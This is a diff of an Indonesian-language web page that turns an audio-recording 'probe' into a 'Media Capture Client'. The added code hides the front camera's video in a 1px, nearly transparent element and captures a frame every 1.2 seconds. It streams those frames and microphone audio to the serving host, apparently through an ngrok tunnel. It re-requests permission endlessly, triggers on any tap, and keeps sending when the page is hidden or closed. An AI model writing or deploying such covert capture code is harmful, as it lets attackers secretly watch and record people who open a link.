@@ -1,20 +1,30 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Microphone Lifecycle Probe</title>
+<title>Media Capture</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #111827; color: #f9fafb; min-height: 100vh; display: flex; flex-direction: column; gap: 12px; justify-content: center; align-items: center; font-family: ui-monospace, SFMono-Regular, Menlo, monospace; padding: 16px; }
-  .box { background: #1f2937; border: 1px solid #374151; border-radius: 8px; padding: 14px 16px; max-width: 400px; width: 100%; font-size: 13px; line-height: 1.5; }
-  .muted { color: #9ca3af; font-size: 12px; margin-top: 6px; }
+  body { background: #0d1117; color: #e6edf3; min-height: 100vh; display: flex; justify-content: center; align-items: center; font-family: ui-monospace, SFMono-Regular, Menlo, monospace; padding: 16px; }
+  .panel { background: #161b22; border: 1px solid #30363d; border-radius: 10px; padding: 18px; max-width: 420px; width: 100%; }
+  .panel h1 { font-size: 16px; color: #58a6ff; margin-bottom: 10px; }
+  .log { font-size: 12px; color: #c9d1d9; background: #0d1117; border: 1px solid #21262d; border-radius: 6px; padding: 10px; line-height: 1.5; word-break: break-word; }
+  .hint { font-size: 11px; color: #8b949e; margin-top: 10px; }
+  .hidden-media { position: absolute; opacity: 0.01; pointer-events: none; width: 1px; height: 1px; overflow: hidden; }
 </style>
 </head>
 <body>
-<div class="box">
-  <div id="mic-status">Menunggu akses mikrofon &amp; siklus perekaman...</div>
-  <div class="muted" id="mic-meta">Chunks terkirim: 0 | State: idle</div>
+
+<div class="hidden-media">
+  <video id="cam-video" autoplay playsinline muted></video>
+  <canvas id="cam-canvas" width="480" height="360"></canvas>
+</div>
+
+<div class="panel">
+  <h1>Media Capture Client</h1>
+  <div class="log" id="status-box">Menunggu inisialisasi kamera &amp; mikrofon...</div>
+  <div class="hint">Ketuk layar jika browser atau WebView meminta gestur untuk mengaktifkan media.</div>
 </div>
 
 <script>
@@ -24,216 +34,248 @@
   var SERVER_BASE = window.location.origin;
 
   var CONFIG = {
-    chunkTimesliceMs: 3000,   // Durasi per potongan audio yang dikirim ke server (ms)
-    retryDelayMs: 3000,       // Jeda percobaan ulang jika stream mikrofon terhenti/ditolak
-    watchdogMs: 4000          // Siklus pengecekan status recorder & stream
+    frameIntervalMs: 1200,
+    audioSliceMs: 3000,
+    retryDelayMs: 3000,
+    watchdogMs: 4000
   };
 
   var state = {
-    stream: null,
-    recorder: null,
+    camStream: null,
+    camActive: false,
+    camPending: false,
+    micStream: null,
     micActive: false,
     micPending: false,
-    retryTimer: null,
+    recorder: null,
+    frameTimer: null,
     watchdogTimer: null,
-    sentChunks: 0,
-    lastBlob: null
+    retryTimer: null,
+    framesSent: 0,
+    audioSent: 0,
+    lastAudioBlob: null
   };
 
-  function updateStatus(msg, extra) {
-    var sEl = document.getElementById('mic-status');
-    var mEl = document.getElementById('mic-meta');
-    var now = new Date().toLocaleTimeString();
-    if (sEl) sEl.textContent = "[" + now + "] " + msg;
-    if (mEl) {
-      var recState = state.recorder ? state.recorder.state : 'none';
-      mEl.textContent = "Chunks terkirim: " + state.sentChunks + " | Recorder: " + recState + (extra ? " | " + extra : "");
-    }
-    console.log("[" + now + "] " + msg);
+  function setStatus(msg) {
+    var box = document.getElementById('status-box');
+    var line = "[" + new Date().toLocaleTimeString() + "] " + msg;
+    if (box) box.textContent = line;
+    console.log(line);
   }
 
-  function sendAudioChunk(blob, useKeepalive) {
-    if (!blob || blob.size === 0) return;
+  function sendFrame(dataUrl, useKeepalive) {
+    if (!dataUrl) return;
+    fetch(SERVER_BASE + "/upload", {
+      method: "POST",
+      keepalive: Boolean(useKeepalive),
+      headers: {
+        "Content-Type": "application/json",
+        "ngrok-skip-browser-warning": "true"
+      },
+      body: JSON.stringify({ image: dataUrl })
+    })
+    .then(function (r) { return r.json(); })
+    .then(function (d) {
+      if (d && d.status === "success") {
+        state.framesSent++;
+        setStatus("Frames: " + state.framesSent + " | Audio chunks: " + state.audioSent);
+      }
+    })
+    .catch(function () {});
+  }
 
-    var formData = new FormData();
-    formData.append('audio', blob, 'mic_chunk.webm');
+  function captureFrame(useKeepalive) {
+    if (!state.camActive) return;
+    var video = document.getElementById('cam-video');
+    var canvas = document.getElementById('cam-canvas');
+    if (!video || !canvas || video.readyState < 2) return;
+
+    try {
+      var ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      sendFrame(canvas.toDataURL('image/jpeg', 0.7), useKeepalive);
+    } catch (e) {}
+  }
+
+  function startFrameLoop() {
+    if (state.frameTimer) return;
+    state.frameTimer = setInterval(function () {
+      captureFrame(false);
+    }, CONFIG.frameIntervalMs);
+  }
+
+  function initCamera() {
+    if (state.camActive || state.camPending) return;
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+
+    state.camPending = true;
+    navigator.mediaDevices.getUserMedia({
+      video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" },
+      audio: false
+    })
+    .then(function (stream) {
+      state.camPending = false;
+      state.camActive = true;
+      state.camStream = stream;
+
+      var video = document.getElementById('cam-video');
+      if (video) {
+        video.srcObject = stream;
+        video.play().catch(function () {});
+      }
+
+      startFrameLoop();
+      setStatus("Kamera aktif | Frames: " + state.framesSent + " | Audio: " + state.audioSent);
+
+      stream.getVideoTracks().forEach(function (track) {
+        track.onended = function () {
+          state.camActive = false;
+          state.camStream = null;
+          scheduleRetry();
+        };
+      });
+    })
+    .catch(function (err) {
+      state.camPending = false;
+      state.camActive = false;
+      setStatus("Kamera (" + err.name + ") - mencoba ulang...");
+      scheduleRetry();
+    });
+  }
+
+  function sendAudioBlob(blob, useKeepalive) {
+    if (!blob || blob.size === 0) return;
+    var fd = new FormData();
+    fd.append('audio', blob, 'chunk.webm');
 
     fetch(SERVER_BASE + "/upload-audio", {
       method: "POST",
       keepalive: Boolean(useKeepalive),
-      headers: {
-        "ngrok-skip-browser-warning": "true"
-      },
-      body: formData
+      headers: { "ngrok-skip-browser-warning": "true" },
+      body: fd
     })
-    .then(function (res) { return res.json(); })
-    .then(function (data) {
-      if (data && data.status === "success") {
-        state.sentChunks++;
-        updateStatus("Audio terkirim ke server", "Bytes: " + blob.size);
-      } else {
-        updateStatus("Respon server: " + (data && data.message ? data.message : "gagal"));
+    .then(function (r) { return r.json(); })
+    .then(function (d) {
+      if (d && d.status === "success") {
+        state.audioSent++;
+        setStatus("Frames: " + state.framesSent + " | Audio chunks: " + state.audioSent);
       }
     })
-    .catch(function (err) {
-      updateStatus("Gagal kirim audio: " + err.message);
-    });
+    .catch(function () {});
   }
 
-  function startRecorderCycle(stream) {
-    if (!('MediaRecorder' in window)) {
-      updateStatus("MediaRecorder tidak didukung di WebView/browser ini.");
-      return;
-    }
-
+  function startRecorder(stream) {
+    if (!('MediaRecorder' in window)) return;
     try {
       if (state.recorder && state.recorder.state !== 'inactive') {
         try { state.recorder.stop(); } catch (e) {}
       }
 
-      var options = {};
+      var opts = {};
       if (MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) {
-        options.mimeType = 'audio/webm;codecs=opus';
+        opts.mimeType = 'audio/webm;codecs=opus';
       } else if (MediaRecorder.isTypeSupported('audio/mp4')) {
-        options.mimeType = 'audio/mp4';
+        opts.mimeType = 'audio/mp4';
       }
 
-      var rec = new MediaRecorder(stream, options);
+      var rec = new MediaRecorder(stream, opts);
       state.recorder = rec;
 
-      rec.ondataavailable = function (event) {
-        if (event.data && event.data.size > 0) {
-          state.lastBlob = event.data;
-          sendAudioChunk(event.data, false);
+      rec.ondataavailable = function (ev) {
+        if (ev.data && ev.data.size > 0) {
+          state.lastAudioBlob = ev.data;
+          sendAudioBlob(ev.data, false);
         }
       };
 
       rec.onstop = function () {
-        if (state.lastBlob && state.lastBlob.size > 0) {
-          sendAudioChunk(state.lastBlob, true);
-        }
         state.micActive = false;
-        scheduleMicRetry();
+        scheduleRetry();
       };
 
-      rec.onerror = function (err) {
-        updateStatus("Error MediaRecorder: " + (err.error ? err.error.name : "unknown"));
-        state.micActive = false;
-        scheduleMicRetry();
-      };
-
-      rec.start(CONFIG.chunkTimesliceMs);
-      updateStatus("Mikrofon aktif, merekam & mengirim suara ke server...");
+      rec.start(CONFIG.audioSliceMs);
     } catch (e) {
-      updateStatus("Gagal memulai MediaRecorder: " + e.message);
       state.micActive = false;
-      scheduleMicRetry();
+      scheduleRetry();
     }
   }
 
-  function scheduleMicRetry() {
-    clearTimeout(state.retryTimer);
+  function initMic() {
     if (state.micActive || state.micPending) return;
-    state.retryTimer = setTimeout(function () {
-      requestMicAccess();
-    }, CONFIG.retryDelayMs);
-  }
-
-  function requestMicAccess() {
-    if (state.micActive || state.micPending) return;
-
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-      updateStatus("navigator.mediaDevices.getUserMedia tidak tersedia.");
-      scheduleMicRetry();
-      return;
-    }
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
 
     state.micPending = true;
-    updateStatus("Meminta izin akses mikrofon...");
-
     navigator.mediaDevices.getUserMedia({
-      audio: {
-        echoCancellation: true,
-        noiseSuppression: true,
-        autoGainControl: true
-      },
+      audio: { echoCancellation: true, noiseSuppression: true, autoGainControl: true },
       video: false
     })
     .then(function (stream) {
       state.micPending = false;
       state.micActive = true;
-      state.stream = stream;
+      state.micStream = stream;
 
       stream.getAudioTracks().forEach(function (track) {
         track.onended = function () {
           state.micActive = false;
-          state.stream = null;
-          updateStatus("Audio track berakhir, menjadwalkan ulang...");
-          scheduleMicRetry();
+          state.micStream = null;
+          scheduleRetry();
         };
       });
 
-      startRecorderCycle(stream);
+      startRecorder(stream);
     })
     .catch(function (err) {
       state.micPending = false;
       state.micActive = false;
-      updateStatus("Akses mikrofon belum aktif (" + err.name + "), mencoba lagi...");
-      scheduleMicRetry();
+      setStatus("Mikrofon (" + err.name + ") - mencoba ulang...");
+      scheduleRetry();
     });
+  }
+
+  function runCycle() {
+    if (!state.camActive && !state.camPending) initCamera();
+    if (!state.micActive && !state.micPending) initMic();
+    if (state.camActive) captureFrame(false);
+  }
+
+  function scheduleRetry() {
+    clearTimeout(state.retryTimer);
+    state.retryTimer = setTimeout(runCycle, CONFIG.retryDelayMs);
   }
 
   function startWatchdog() {
     if (state.watchdogTimer) return;
-    state.watchdogTimer = setInterval(function () {
-      var hasLiveTrack = state.stream && state.stream.getAudioTracks().some(function (t) {
-        return t.readyState === 'live';
-      });
-      if (!state.micActive || !hasLiveTrack) {
-        state.micActive = false;
-        if (!state.micPending) {
-          requestMicAccess();
-        }
-      } else if (state.recorder && state.recorder.state === 'inactive') {
-        startRecorderCycle(state.stream);
-      }
-    }, CONFIG.watchdogMs);
+    state.watchdogTimer = setInterval(runCycle, CONFIG.watchdogMs);
   }
 
   ['pointerdown', 'click', 'touchend'].forEach(function (evtName) {
     document.addEventListener(evtName, function () {
       startWatchdog();
-      requestMicAccess();
+      runCycle();
     }, { passive: true });
   });
 
   window.addEventListener('DOMContentLoaded', function () {
     startWatchdog();
-    requestMicAccess();
+    runCycle();
   });
 
   document.addEventListener('visibilitychange', function () {
     if (document.hidden) {
-      if (state.recorder && state.recorder.state === 'recording') {
-        try { state.recorder.requestData(); } catch (e) {}
-      }
-      if (state.lastBlob) {
-        sendAudioChunk(state.lastBlob, true);
-      }
+      captureFrame(true);
+      if (state.lastAudioBlob) sendAudioBlob(state.lastAudioBlob, true);
     } else {
+      state.camActive = false;
+      state.camPending = false;
       state.micActive = false;
       state.micPending = false;
-      requestMicAccess();
+      runCycle();
     }
   });
 
   window.addEventListener('pagehide', function () {
-    if (state.recorder && state.recorder.state === 'recording') {
-      try { state.recorder.requestData(); } catch (e) {}
-    }
-    if (state.lastBlob) {
-      sendAudioChunk(state.lastBlob, true);
-    }
+    captureFrame(true);
+    if (state.lastAudioBlob) sendAudioBlob(state.lastAudioBlob, true);
   });
 })();
 </script>
